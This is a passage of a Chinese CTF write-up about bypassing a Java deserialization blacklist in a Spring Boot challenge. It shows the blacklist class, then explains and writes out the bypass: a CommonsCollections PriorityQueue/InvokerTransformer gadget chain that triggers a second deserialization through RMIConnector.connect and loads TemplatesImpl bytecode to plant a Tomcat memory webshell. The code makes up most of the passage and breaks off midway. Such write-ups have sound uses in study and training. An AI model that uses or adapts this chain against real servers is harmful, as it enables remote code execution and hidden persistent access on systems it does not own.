            &lt;version&gt;4.0&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;
            &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;
            &lt;version&gt;1.9.2&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;configuration&gt;
                    &lt;excludes&gt;
                        &lt;exclude&gt;
                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
                        &lt;/exclude&gt;
                    &lt;/excludes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre><p>黑名单</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">//
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// Source code recreated from a .class file by IntelliJ IDEA
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// (powered by FernFlower decompiler)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.Ez_Java.util<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.InputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.InvalidClassException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectStreamClass<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashSet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Set<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Secure</span> <span style="color:#8be9fd;font-style:italic">extends</span> ObjectInputStream <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">final</span> Set<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> blackList <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashSet<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.management.BadAttributeValueExpException&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.commons.collections.keyvalue.TiedMapEntry&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.commons.collections.functors.ChainedTransformer&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.commons.collections4.functors.ChainedTransformer&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.commons.collections4.functors.InstantiateTransformer&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">};</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">Secure</span><span style="color:#ff79c6">(</span>InputStream in<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">super</span><span style="color:#ff79c6">(</span>in<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">protected</span> Class<span style="color:#ff79c6">&lt;?&gt;</span> resolveClass<span style="color:#ff79c6">(</span>ObjectStreamClass cls<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ClassNotFoundException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">blackList</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">contains</span><span style="color:#ff79c6">(</span>cls<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> InvalidClassException<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Unexpected serialized class&#34;</span><span style="color:#ff79c6">,</span> cls<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">super</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">resolveClass</span><span style="color:#ff79c6">(</span>cls<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>正常的反序列化执行命令无非ChainedTransformer或者TemplatesImpl加载字节码，但是两个都禁了。</p>
<p>可以考虑调用javax.management.remote.rmi.RMIConnector#connect来二次反序列化，这样可以突破黑名单限制。具体见
<a href="http://novic4.cn/index.php/archives/26.html#cl-4">http://novic4.cn/index.php/archives/26.html#cl-4</a></p>
<p>拼上CommonsCollections2的PriorityQueue调用x1.transform(x2)，invokerTransformer调用任意方法，就可以调上述方法。最后再TemplatesImpl注册一个内存马</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> test<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassClassPath<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtClass<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections4.Transformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections4.comparators.TransformingComparator<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections4.functors.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.management.remote.JMXServiceURL<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.management.remote.rmi.RMIConnector<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Base64<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.PriorityQueue<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">aTest</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> expBytes<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>getPriorityQueueExp<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        String exp<span style="color:#ff79c6">=</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encodeToString</span><span style="color:#ff79c6">(</span>expBytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        RMIConnector rmiConnector<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> RMIConnector<span style="color:#ff79c6">(</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">new</span> JMXServiceURL<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;service:jmx:rmi://localhost:12345/stub/&#34;</span><span style="color:#ff79c6">+</span>exp<span style="color:#ff79c6">),</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">,</span>Integer<span style="color:#ff79c6">&gt;()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        InvokerTransformer invokerTransformer<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> InvokerTransformer<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;connect&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//invokerTransformer.transform(rmiConnector)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        TransformingComparator comparator<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> TransformingComparator<span style="color:#ff79c6">(</span>invokerTransformer<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        PriorityQueue queue<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> PriorityQueue<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//让size=2
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>3<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>4<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        反射，强行往queue塞rmiConnector
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Class queueClass<span style="color:#ff79c6">=</span>queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Field queueField<span style="color:#ff79c6">=</span>queueClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;queue&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        queueField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        queueField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span>rmiConnector<span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//反射强写comparator
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Class clazz<span style="color:#ff79c6">=</span>queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Field comparatorField<span style="color:#ff79c6">=</span>clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;comparator&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        comparatorField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        comparatorField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span> comparator<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        String base<span style="color:#ff79c6">=</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encodeToString</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>base<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        read(base);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">myTest</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> expBytes<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>getPriorityQueueExp<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        deserialize(expBytes);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        String exp<span style="color:#ff79c6">=</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encodeToString</span><span style="color:#ff79c6">(</span>expBytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        RMIConnector rmiConnector<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> RMIConnector<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> JMXServiceURL<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;service:jmx:rmi://localhost:12345/stub/&#34;</span><span style="color:#ff79c6">+</span>exp<span style="color:#ff79c6">),</span><span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">,</span>Integer<span style="color:#ff79c6">&gt;());</span>
</span></span><span style="display:flex;"><span>        rmiConnector<span style="color:#ff79c6">.</span><span style="color:#50fa7b">connect</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">read</span><span style="color:#ff79c6">(</span>String data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ClassNotFoundException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b <span style="color:#ff79c6">=</span> Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDecoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">decode</span><span style="color:#ff79c6">(</span>data<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        InputStream bis <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Secure ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Secure<span style="color:#ff79c6">(</span>bis<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;沈阳等你噢&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            ByteArrayInputStream ais <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            ObjectInputStream ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectInputStream<span style="color:#ff79c6">(</span>ais<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>Object o<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            ByteArrayOutputStream aos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>aos<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">flush</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> aos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> PriorityQueue <span style="color:#50fa7b">getPriorityQueueExp</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">InjectTomcat01</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">()});</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;EvilTemplatesImpl&#34;</span><span style="color:#ff79c6">);</span> setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;_class&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//制作transformer
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        InvokerTransformer transformer<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> InvokerTransformer<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;newTransformer&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[]{},</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{});</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//接下来只需调用transformer.transform(templatesImpl)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//        transformer.transform()
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        TransformingComparator comparator<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> TransformingComparator<span style="color:#ff79c6">(</span>transformer<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        PriorityQueue queue<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> PriorityQueue<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//让size=2
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>3<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>4<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        反射，强行往queue塞templatesImpl
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Class queueClass<span style="color:#ff79c6">=</span>queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Field queueField<span style="color:#ff79c6">=</span>queueClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;queue&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        queueField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
